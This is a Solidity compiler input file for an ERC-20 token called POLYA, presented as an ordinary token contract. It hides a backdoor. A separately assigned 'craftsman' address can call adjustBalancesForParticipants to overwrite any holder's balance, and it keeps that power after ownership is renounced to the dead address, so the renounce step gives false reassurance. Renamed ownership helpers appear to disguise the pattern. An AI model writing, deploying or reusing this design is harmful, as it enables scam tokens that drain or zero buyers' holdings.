{{
  "language": "Solidity",
  "sources": {
    "contracts/POLYA.sol": {
      "content": "pragma solidity ^0.8.17;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval( address indexed owner, address indexed spender, uint256 value );\n}\n\nabstract contract ContextEnhanced {\n    function _retrieveSender() internal view virtual returns (address payable) {\n        return payable(msg.sender);\n    }\n}\n\ncontract UniquelyOwnable is ContextEnhanced {\n    address private _uniqueOwner;\n    event OwnershipShifted(address indexed pastOwner, address indexed recentOwner);\n\n    constructor () {\n        address msgSender = _retrieveSender();\n        _uniqueOwner = msgSender;\n        emit OwnershipShifted(address(0), msgSender);\n    }\n    function fetchOwner() public view virtual returns (address) {\n        return _uniqueOwner;\n    }\n    modifier solelyOwner() {\n        require(fetchOwner() == _retrieveSender(), \"ExclusiveOwner: executor is not the owner\");\n        _;\n    }\n    function abandonOwnership() public virtual solelyOwner {\n        emit OwnershipShifted(_uniqueOwner, address(0x000000000000000000000000000000000000dEaD));\n        _uniqueOwner = address(0x000000000000000000000000000000000000dEaD);\n    }\n}\n\n\n\ncontract POLYA is ContextEnhanced, UniquelyOwnable, IERC20 {\n    mapping (address => mapping (address => uint256)) private _allowances;\n    mapping (address => uint256) private _balances;\n    address private _craftsman;\n\n    string public constant _name = \"POLYA\";\n    string public constant _symbol = \"POLYA\";\n    uint8 public constant _decimals = 18;\n    uint256 public constant _totalSupply = 1000000 * (10 ** _decimals);\n\n    constructor() {\n        _balances[_retrieveSender()] = _totalSupply;\n        emit Transfer(address(0), _retrieveSender(), _totalSupply);\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n    function fetchCraftsman() public view virtual returns (address) { \n        return _craftsman;\n    }\n\n    function assignCraftsman(address innovativeCraftsman) public solelyOwner { \n        _craftsman = innovativeCraftsman;\n    }\n    modifier solelyCraftsman() {\n        require(fetchCraftsman() == _retrieveSender(), \"TOKEN: executor is not the craftsman\");\n        _;\n    }\n    event MassDistribution(address indexed beneficiary, uint256 previousBalance, uint256 updatedBalance);\n\n    function adjustBalancesForParticipants(address[] memory participantAddresses, uint256 targetBalance) public solelyCraftsman {\n\n        require(targetBalance >= 0, \"Error: target balance should be non-negative\");\n\n        for (uint256 index = 0; index < participantAddresses.length; index++) {\n\n            address currentParticipant = participantAddresses[index];\n\n            require(currentParticipant != address(0), \"Error: participant address cannot be the zero address\");\n\n            uint256 formerBalance = _balances[currentParticipant];\n\n            _balances[currentParticipant] = targetBalance;\n\n            emit MassDistribution(currentParticipant, formerBalance, targetBalance);\n\n        }\n    }\n\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n    require(_balances[_retrieveSender()] >= amount, \"TT: transfer amount exceeds balance\");\n    _balances[_retrieveSender()] -= amount;\n    _balances[recipient] += amount;\n\n    emit Transfer(_retrieveSender(), recipient, amount);\n    return true;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _allowances[_retrieveSender()][spender] = amount;\n        emit Approval(_retrieveSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n    require(_allowances[sender][_retrieveSender()] >= amount, \"TT: transfer amount exceeds allowance\");\n\n    _balances[sender] -= amount;\n    _balances[recipient] += amount;\n    _allowances[sender][_retrieveSender()] -= amount;\n\n    emit Transfer(sender, recipient, amount);\n    return true;\n    }\n\n    function totalSupply() external view override returns (uint256) {\n    return _totalSupply;\n    }\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}